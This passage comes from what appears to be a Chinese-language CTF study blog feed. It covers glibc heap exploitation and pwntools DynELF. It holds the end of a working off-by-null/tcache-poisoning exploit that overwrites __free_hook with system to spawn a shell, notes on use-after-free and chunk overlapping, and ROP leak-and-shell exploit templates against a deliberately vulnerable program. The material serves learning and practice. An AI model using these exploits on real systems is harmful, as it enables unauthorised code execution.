class="built_in">str</span>(elect) )</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choose_idx</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">&quot;Index:\n&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size, content=<span class="string">&#x27;A&#x27;</span></span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    choose_idx(index)</span><br><span class="line">    sla(<span class="string">&quot;Size:&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">&quot;Content:&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content,full=<span class="literal">False</span></span>):</span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    choose_idx(index)</span><br><span class="line">    sa(<span class="string">&quot;Content:&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    choose_idx(index)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    choose_idx(index)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">start()</span><br><span class="line"><span class="comment"># =============================================</span></span><br><span class="line"><span class="comment"># step1 P&amp;0xff = 0</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x418</span>, <span class="string">&quot;A&quot;</span>*<span class="number">0x100</span>) <span class="comment">#0 A = P-&gt;fd</span></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x108</span>) <span class="comment">#1 barrier</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x438</span>, <span class="string">&quot;B0&quot;</span>*<span class="number">0x100</span>) <span class="comment">#2 B0 helper</span></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x438</span>, <span class="string">&quot;C0&quot;</span>*<span class="number">0x100</span>) <span class="comment">#3 C0 = P , P&amp;0xff = 0</span></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x108</span>,<span class="string">&#x27;4&#x27;</span>*<span class="number">0x100</span>) <span class="comment">#4 barrier</span></span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x488</span>, <span class="string">&quot;H&quot;</span>*<span class="number">0x100</span>) <span class="comment"># H0. helper for write bk-&gt;fd. vitcim chunk.</span></span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x428</span>, <span class="string">&quot;D&quot;</span>*<span class="number">0x100</span>) <span class="comment"># 6 D = P-&gt;bk</span></span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x108</span>) <span class="comment"># 7 barrier</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># =============================================</span></span><br><span class="line"><span class="comment"># step 2 use unsortedbin to set p-&gt;fd =A , p-&gt;bk=D</span></span><br><span class="line">delete(<span class="number">0</span>) <span class="comment"># A</span></span><br><span class="line">delete(<span class="number">3</span>) <span class="comment"># C0</span></span><br><span class="line">delete(<span class="number">6</span>) <span class="comment"># D</span></span><br><span class="line"><span class="comment"># unsortedbin: D-C0-A   C0-&gt;FD=A</span></span><br><span class="line">delete(<span class="number">2</span>) <span class="comment"># merge B0 with C0. preserve p-&gt;fd p-&gt;bk</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x458</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x438</span> + p64(<span class="number">0x551</span>)[:-<span class="number">2</span>])  <span class="comment"># put A,D into largebin, split BC. use B1 to set p-&gt;size=0x551</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># recovery</span></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x418</span>)  <span class="comment"># C1 from ub</span></span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x428</span>)  <span class="comment"># bk  D  from largebin</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x418</span>,<span class="string">&quot;0&quot;</span>*<span class="number">0x100</span>)  <span class="comment"># fd    A from largein</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># =============================================</span></span><br><span class="line"><span class="comment"># step3 use unsortedbin to set fd-&gt;bk</span></span><br><span class="line"><span class="comment"># partial overwrite fd -&gt; bk </span></span><br><span class="line">delete(<span class="number">0</span>) <span class="comment"># A=P-&gt;fd</span></span><br><span class="line">delete(<span class="number">3</span>) <span class="comment"># C1</span></span><br><span class="line"><span class="comment"># unsortedbin: C1-A ,   A-&gt;BK = C1</span></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x418</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span>)  <span class="comment"># 2 partial overwrite bk    A-&gt;bk = p</span></span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x418</span>)   </span><br><span class="line"></span><br><span class="line"><span class="comment"># =============================================</span></span><br><span class="line"><span class="comment"># step4 use ub to set bk-&gt;fd</span></span><br><span class="line">delete(<span class="number">3</span>) <span class="comment"># C1</span></span><br><span class="line">delete(<span class="number">6</span>) <span class="comment"># D=P-&gt;bk</span></span><br><span class="line"><span class="comment"># ub-D-C1    D-&gt;FD = C1</span></span><br><span class="line">delete(<span class="number">5</span>) <span class="comment"># merge D with H, preserve D-&gt;fd </span></span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x500</span>-<span class="number">8</span>, <span class="string">&#x27;6&#x27;</span>*<span class="number">0x488</span> + p64(<span class="number">0x431</span>)) <span class="comment"># H1. bk-&gt;fd = p, partial write \x00</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x3b0</span>) <span class="comment"># recovery</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># =============================================</span></span><br><span class="line"><span class="comment"># step5 off by null</span></span><br><span class="line">edit(<span class="number">4</span>, <span class="number">0x100</span>*<span class="string">&#x27;4&#x27;</span> + p64(<span class="number">0x550</span>))<span class="comment"># off by null, set fake_prev_size = 0x550, prev inuse=0</span></span><br><span class="line">delete(<span class="number">6</span>) <span class="comment"># merge H1 with C0. trigger overlap C0,4,6</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># =============================================</span></span><br><span class="line"><span class="comment"># step6 overlap </span></span><br><span class="line">show(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x438</span>) <span class="comment"># put libc to chunk 4</span></span><br><span class="line"><span class="comment"># z()</span></span><br><span class="line">show(<span class="number">4</span>) <span class="comment"># libc</span></span><br><span class="line">libc_addr = uu64(r(<span class="number">6</span>)) </span><br><span class="line">libc_base = libc_addr -  <span class="number">0x1ecbe0</span></span><br><span class="line">leak(<span class="string">&#x27;libc_base&#x27;</span>, libc_base)</span><br><span class="line">leak(<span class="string">&#x27;libc_addr&#x27;</span>, libc_addr)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">6</span>) <span class="comment"># consolidate</span></span><br><span class="line">add(<span class="number">6</span>, <span class="number">0x458</span>, <span class="number">0x438</span>*<span class="string">&#x27;6&#x27;</span>+p64(<span class="number">0x111</span>)) <span class="comment"># fix size for chunk 4. 6 overlap 4</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(<span class="number">7</span>) <span class="comment"># tcache</span></span><br><span class="line">delete(<span class="number">4</span>) <span class="comment"># tcache</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">6</span>, <span class="number">0x438</span>*<span class="string">&#x27;6&#x27;</span>+p64(<span class="number">0x111</span>)+p64(libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>])) <span class="comment"># set 4-&gt;fd= __free_hook</span></span><br><span class="line"><span class="comment"># z()</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x108</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x108</span>)</span><br><span class="line">edit(<span class="number">4</span>, p64(libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">z()</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><h1 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h1><p>uaf 漏洞产生的主要原因是释放了一个堆块后，并没有将该指针置为 NULL，这样导致该指针处于悬空的状态，同样被释放的内存如果被恶意构造数据，就有可能会被利用。</p><ul><li>内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃。</li><li>内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么程序很有可能可以正常运转。</li><li>内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，就很有可能会出现奇怪的问题。</li></ul><p>而我们一般所指的 <strong>Use After Free</strong> 漏洞主要是后两种。此外，<strong>我们一般称被释放后没有被设置为 NULL 的内存指针为 dangling pointer。</strong></p><h1 id="Chunk-Extend-and-Overlapping"><a href="#Chunk-Extend-and-Overlapping" class="headerlink" title="Chunk Extend and Overlapping"></a>Chunk Extend and Overlapping</h1><p>chunk extend 是堆漏洞的一种常见利用手法，通过 extend 可以实现 chunk overlapping 的效果。这种利用方法需要以下的时机和条件：</p><ul><li>程序中存在基于堆的漏洞</li><li>漏洞可以控制 chunk header 中的数据</li></ul><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>chunk extend 技术能够产生的原因在于 ptmalloc 在对堆 chunk 进行操作时使用的各种宏。</p><p>在 ptmalloc 中，获取 chunk 块大小的操作如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/* Get size, ignoring use bits */</span><br><span class="line">#define chunksize(p) (chunksize_nomask(p) &amp; ~(SIZE_BITS))</span><br><span class="line"></span><br><span class="line">/* Like chunksize, but do not mask SIZE_BITS.  */</span><br><span class="line">#define chunksize_nomask(p) ((p)-&gt;mchunk_size)</span><br></pre></td></tr></table></figure><p>一种是直接获取 chunk 的大小，不忽略掩码部分，另外一种是忽略掩码部分。</p><p>在 ptmalloc 中，<strong>获取下一 chunk 块</strong>地址的操作如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/* Ptr to next physical malloc_chunk. */</span><br><span class="line">#define next_chunk(p) ((mchunkptr)(((char *) (p)) + chunksize(p)))</span><br></pre></td></tr></table></figure><p>即使用<strong>当前块指针加上当前块大小。</strong></p><p>在 ptmalloc 中，<strong>获取前一个 chunk</strong> 信息的操作如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/* Size of the chunk below P.  Only valid if prev_inuse (P).  */</span><br><span class="line">#define prev_size(p) ((p)-&gt;mchunk_prev_size)</span><br><span class="line"></span><br><span class="line">/* Ptr to previous physical malloc_chunk.  Only valid if prev_inuse (P).  */</span><br><span class="line">#define prev_chunk(p) ((mchunkptr)(((char *) (p)) - prev_size(p)))</span><br></pre></td></tr></table></figure><p>即通过 <strong>malloc_chunk-&gt;prev_size 获取前一块大小</strong>，然后使用本 chunk 地址减去所得大小。</p><p>在 ptmalloc，<strong>判断当前 chunk 是否是 use</strong> 状态的操作如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#define inuse(p)</span><br><span class="line">    ((((mchunkptr)(((char *) (p)) + chunksize(p)))-&gt;mchunk_size) &amp; PREV_INUSE)</span><br></pre></td></tr></table></figure><p>即<strong>查看下一 chunk 的 prev_inuse 域</strong>，而下一块地址又如我们前面所述是根据当前 chunk 的 size 计算得出的。</p><p>通过上面几个宏可以看出，ptmalloc 通过 chunk header 的数据判断 chunk 的使用情况和对 chunk 的前后块进行定位。简而言之，chunk extend 就是通过控制 size 和 pre_size 域来实现跨越块操作从而导致 overlapping 的。</p><p>与 chunk extend 类似的还有一种称为 chunk shrink 的操作。。</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习记录 </tag>
            
            <tag> 堆 </tag>
            
            <tag> 堆利用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn技巧</title>
      <link href="/posts/69471/"/>
      <url>/posts/69471/</url>
      
        <content type="html"><![CDATA[<h1 id="DynELF"><a href="#DynELF" class="headerlink" title="DynELF"></a>DynELF</h1><p>DynELF是pwntools中专门用来应对没有libc情况的漏洞利用模块，在提供一个目标程序任意地址内存泄漏函数的情况下，可以解析任意加载库的任意符号地址。</p><p><strong>其原理就是通过程序漏洞泄露出任意地址内容，结合ELF文件的结构特征获取对应版本文件并计算对比出目标符号在内存中的地址</strong></p><h2 id="适用情况"><a href="#适用情况" class="headerlink" title="适用情况"></a>适用情况</h2><p>DynELF泄露函数方法最方便的使用情况是程序中最好含有write函数且可以多次调用main函数，不然的话还是用LibcSearcher的方法泄露比较好</p><h2 id="引例"><a href="#引例" class="headerlink" title="引例"></a>引例</h2><h3 id="官方文档给的例子"><a href="#官方文档给的例子" class="headerlink" title="官方文档给的例子"></a>官方文档给的例子</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Assume a process or remote connection</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwnme&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Declare a function that takes a single address, and</span></span><br><span class="line"><span class="comment"># leaks at least one byte at that address.</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">address</span>):</span><br><span class="line">    data = p.read(address, <span class="number">4</span>)</span><br><span class="line">    log.debug(<span class="string">&quot;%#x =&gt; %s&quot;</span>, address, enhex(data <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="comment"># For the sake of this example, let&#x27;s say that we</span></span><br><span class="line"><span class="comment"># have any of these pointers.  One is a pointer into</span></span><br><span class="line"><span class="comment"># the target binary, the other two are pointers into libc</span></span><br><span class="line">main   = <span class="number">0xfeedf4ce</span></span><br><span class="line">libc   = <span class="number">0xdeadb000</span></span><br><span class="line">system = <span class="number">0xdeadbeef</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># With our leaker, and a pointer into our target binary,</span></span><br><span class="line"><span class="comment"># we can resolve the address of anything.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># We do not actually need to have a copy of the target</span></span><br><span class="line"><span class="comment"># binary for this to work.</span></span><br><span class="line">d = DynELF(leak, main)</span><br><span class="line"><span class="keyword">assert</span> d.lookup(<span class="literal">None</span>,     <span class="string">&#x27;libc&#x27;</span>) == libc</span><br><span class="line"><span class="keyword">assert</span> d.lookup(<span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;libc&#x27;</span>) == system</span><br><span class="line"></span><br><span class="line"><span class="comment"># However, if we *do* have a copy of the target binary,</span></span><br><span class="line"><span class="comment"># we can speed up some of the steps.</span></span><br><span class="line">d = DynELF(leak, main, elf=ELF(<span class="string">&#x27;./pwnme&#x27;</span>))</span><br><span class="line"><span class="keyword">assert</span> d.lookup(<span class="literal">None</span>,     <span class="string">&#x27;libc&#x27;</span>) == libc</span><br><span class="line"><span class="keyword">assert</span> d.lookup(<span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;libc&#x27;</span>) == system</span><br><span class="line"></span><br><span class="line"><span class="comment"># Alternately, we can resolve symbols inside another library,</span></span><br><span class="line"><span class="comment"># given a pointer into it.</span></span><br><span class="line">d = DynELF(leak, libc + <span class="number">0x1234</span>)</span><br><span class="line"><span class="keyword">assert</span> d.lookup(<span class="string">&#x27;system&#x27;</span>)      == system</span><br></pre></td></tr></table></figure><p><strong>log.debug(“%#x =&gt; %s”, address, enhex(data or ‘’))解释</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">log.debug是pwntools中的日志工具，%#x表示输出一个整数的十六进制表示（带有0x前缀），%s表示输出一个字符串。address是要输出的内存地址，data是该地址对应的数据（一个字符串），enhex是pwntools中的工具函数，用于将字符串转换为十六进制表示的字符串（每个字节用两个十六进制字符表示），与encode(&#x27;hex&#x27;)相似。</span><br><span class="line">整个输出结果类似于：[DEBUG] 0x12345678 =&gt; 6162636465666768</span><br><span class="line">(data or &#x27;&#x27;)的作用是，当data变量为空（None）或者为False时，返回一个空字符串&#x27;&#x27;，否则返回data本身。</span><br></pre></td></tr></table></figure><h3 id="一个更具体的例子"><a href="#一个更具体的例子" class="headerlink" title="一个更具体的例子"></a>一个更具体的例子</h3><p><strong>源代码</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vulfun</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">128</span>];</span><br><span class="line">    read(STDIN_FILENO, buf, <span class="number">256</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span>&#123;</span><br><span class="line">    vulfun();</span><br><span class="line">    write(STDOUT_FILENO, <span class="string">&quot;Hello,World\n&quot;</span>, <span class="number">13</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf  = ELF(<span class="string">&#x27;elf&#x27;</span>)</span><br><span class="line">plt_write = elf.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">plt_read = elf.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">vulfun_addr = <span class="number">0x08048404</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">address</span>):</span><br><span class="line">payload1 = <span class="string">&#x27;a&#x27;</span>*<span class="number">140</span> + p32(plt_write) + p32(vulfun_addr) + p32(<span class="number">1</span>) + p32(address) + p32(<span class="number">4</span>)</span><br><span class="line">p.send(payload1)</span><br><span class="line">data = p.recv(<span class="number">4</span>)</span><br><span class="line"><span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./elf&#x27;</span>)</span><br><span class="line">d=DynELF(leak, ptr)</span><br><span class="line">system_addr = d.lookup(<span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;libc&#x27;</span>)</span><br><span class="line"></span><br><span class="line">bss_addr = <span class="number">0x0804a018</span></span><br><span class="line">pppr = <span class="number">0x080484bd</span></span><br><span class="line">payload2 = <span class="string">&#x27;a&#x27;</span>*<span class="number">140</span> + p32(plt_read) + p32(pppr) + p32(<span class="number">0</span>) + p32(bss_addr) + p32(<span class="number">8</span>) + p32(system_addr) + p32(vulfun_addr) + p32(bss_addr) <span class="comment">#这里藏了一个之前没注意过的知识点①</span></span><br><span class="line">p.send(payload2)</span><br><span class="line">p.send(<span class="string">&quot;/bin/sh\0&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><details class="folding-tag" red><summary> ① </summary>              <div class='content'>              <p>上面的exp使用了一个pppr(其实就是pop-pop-pop-ret),作为read的返回地址,这个是很有必要的,鉴于32位下返回地址和参数的互通性(64位也会但一般都不会超过6个参数）,如果read后直接接需要的函数地址那么read的参数又会变为所需函数的返回地址和参数,这显然不是我们所希望的,于是通过pppr来<strong>重新划分函数栈</strong></p>              </div>            </details><h2 id="基础框架"><a href="#基础框架" class="headerlink" title="基础框架"></a>基础框架</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">p = remote(ip, port)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">addr</span>):</span><br><span class="line">       payload2leak_addr = “****” + pack(addr) + “****”</span><br><span class="line">       p.send(payload2leak_addr)</span><br><span class="line">       data = p.recv()</span><br><span class="line">       <span class="keyword">return</span> data</span><br><span class="line"> </span><br><span class="line">d = DynELF(leak, pointer = pointer_into_ELF_file, elf = ELFObject)</span><br><span class="line">system_addr = d.lookup(<span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;libc&#x27;</span>)</span><br><span class="line">read_add = d.lookup(<span class="string">&#x27;read&#x27;</span>,<span class="string">&#x27;libc&#x27;</span>)</span><br></pre></td></tr></table></figure><p>使用DynELF时，我们需要使用一个<strong>leak函数</strong>作为<strong>必选参数</strong>，<u>指向ELF文件的指针或者使用ELF类加载的目标文件至少提供一个作为可选参数</u>，以初始化一个DynELF类的实例d。然后就可以通过这个实例d的方法lookup来搜寻libc库函数了；<br>其中，<strong>leak函数需要使用目标程序本身的漏洞泄露出由DynELF类传入的<u>int型参数addr</u><u>对应的内存地址中的数据</u>。</strong>且由于DynELF会多次调用leak函数，这个函数<u>必须能任意次使用</u>，即不能泄露几个地址之后就导致程序崩溃。<strong>由于需要泄露数据</strong>，<strong>payload中必然包含着打印函数，如write, puts, printf等</strong>；<br>而通过实践发现<strong>write函数是最理想的</strong>，因为write函数的特点在于<strong>其输出完全由其参数size决定</strong>，只要目标地址可读，<strong>size填多少就输出多少，不会受到诸如‘\0’, ‘\n’之类的字符影响</strong>；<u>而puts, printf函数会受到诸如‘\0’, ‘\n’之类的字符影响，在对数据的读取和处理有一定的难度</u></p><p>结合上面的引例，对DynELF应该能有一个基础认识</p><h2 id="leak模板"><a href="#leak模板" class="headerlink" title="leak模板"></a>leak模板</h2><h3 id="Write函数模板"><a href="#Write函数模板" class="headerlink" title="Write函数模板"></a>Write函数模板</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">address</span>):</span><br><span class="line"><span class="comment">#address是待泄露的地址</span></span><br><span class="line">    payload = offset + p32(write) + p32(main_addr) + p32(<span class="number">1</span>) + p32(address) + p32(<span class="number">4</span>)</span><br><span class="line">    <span class="comment">#payload = 溢出位 + write\puts\printf + 返回地址 + 参数1 + 参数2 + 参数3</span></span><br><span class="line">    sh.sendline(payload)</span><br><span class="line">    data = sh.recv(<span class="number">4</span>) </span><br><span class="line">    <span class="comment">#用于接受返回的地址，32位接收4位，64位接收8位</span></span><br><span class="line">log.success(<span class="string">&#x27;%x -&gt; %s&#x27;</span>%(address,<span class="built_in">hex</span>(u32(data))))</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line">libc = DynELF(leak, elf=ELF(file_path))</span><br><span class="line"><span class="comment">#初始化DynELF模块，也就是程序的elf变量</span></span><br><span class="line">system_addr = libc.lookup(<span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;libc&#x27;</span>)</span><br><span class="line"><span class="comment">#在libc文件中搜索system</span></span><br></pre></td></tr></table></figure><h3 id="puts函数模板"><a href="#puts函数模板" class="headerlink" title="puts函数模板"></a>puts函数模板</h3><p>puts 函数使用的参数只有一个，即需要输出的数据的起始地址，<strong>它会一直输出直到遇到 <u>\x00</u></strong>，所以它输出的数据长度是<u>不容易控制</u>的，我们无法预料到零字符会出现在哪里，截止后，<strong>puts 还会自动在末尾加上换行符</strong> 。<strong>该函数的优点是在 64 位程序中也可以很方便地使用。**</strong>缺点是会受到零字符截断的影响**，在写 leak 函数时需要特殊处理，在打印出的数据中正确地筛选我们需要的部分，如果打印出了空字符串，则要手动赋值<code>\x00</code>，包括我们在 dump 内存的时候，也常常受这个问题的困扰，</p><h3 id="Puts函数后没有其他输出"><a href="#Puts函数后没有其他输出" class="headerlink" title="Puts函数后没有其他输出"></a><code>Puts</code>函数后没有其他输出</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">address</span>):</span><br><span class="line">  count = <span class="number">0</span></span><br><span class="line">  data = <span class="string">&#x27;&#x27;</span></span><br><span class="line">  payload = p32(puts_plt_addr) + p32(main_addr) + p32(address)</span><br><span class="line">  sh.send(payload)</span><br><span class="line">  <span class="built_in">print</span> sh.recvuntil(<span class="string">&#x27;xxx\n&#x27;</span>) <span class="comment">#一定要在puts前释放完输出</span></span><br><span class="line">  up = <span class="string">&quot;&quot;</span></span><br><span class="line">  <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    c = sh.recv(numb=<span class="number">1</span>, timeout=<span class="number">1</span>) </span><br><span class="line">    count += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> up == <span class="string">&#x27;\n&#x27;</span> <span class="keyword">and</span> c == <span class="string">&quot;&quot;</span>:  </span><br><span class="line">      buf = buf[:-<span class="number">1</span>]             </span><br><span class="line">      buf += <span class="string">&quot;\x00&quot;</span></span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      buf += c</span><br><span class="line">    up = c</span><br><span class="line">  data = buf[:<span class="number">4</span>]  </span><br><span class="line">  log.info(<span class="string">&quot;%#x =&gt; %s&quot;</span> % (address, (data <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span>).encode(<span class="string">&#x27;hex&#x27;</span>)))</span><br><span class="line">  <span class="keyword">return</span> data</span><br></pre></td></tr></table></figure><h3 id="Puts函数后程序还有其他输出"><a href="#Puts函数后程序还有其他输出" class="headerlink" title="Puts函数后程序还有其他输出"></a><code>Puts</code>函数后程序还有其他输出</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span 